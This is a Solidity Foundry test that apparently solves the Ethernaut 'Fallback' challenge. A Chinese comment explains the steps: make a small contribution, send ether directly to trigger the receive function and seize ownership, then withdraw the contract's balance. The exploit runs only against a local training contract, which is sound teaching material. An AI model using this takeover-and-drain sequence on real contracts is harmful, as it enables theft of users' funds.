pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Fallback.sol";


/** 
 * 解题思路：将合约的 owner 控制权变成自己的，分为两步：
 * 1. 调用 contribute 满足 receive 的调用条件
 * 2. 直接转账触发 receive 机制，获得 owner
 * 最后调用 withdraw 将余额取出  
 */
contract FallbackHackTest is Test {
    Fallback public f;
    address hacker = address(hacker);

    function setUp() public {
        f = new Fallback();
        vm.deal(hacker, 1 ether);
    }
    function testFallback() public {
        vm.startPrank(hacker);

        console.log("before hacker, Fallback owner: ");
        console.logAddress(f.owner());
        f.contribute{value: 0.0001 ether}();
        (bool result, ) = address(f).call{value: 1000}("");
        require(result, "send eth failed");
        console.log("after hacker, Fallback owner: ");
        console.logAddress(f.owner());

        console.log("before withdraw, hacker balance:");
        console.logUint(hacker.balance);

        f.withdraw();

        console.log("after withdraw, hacker balance:");
        console.logUint(hacker.balance);
        vm.stopPrank();
    }
}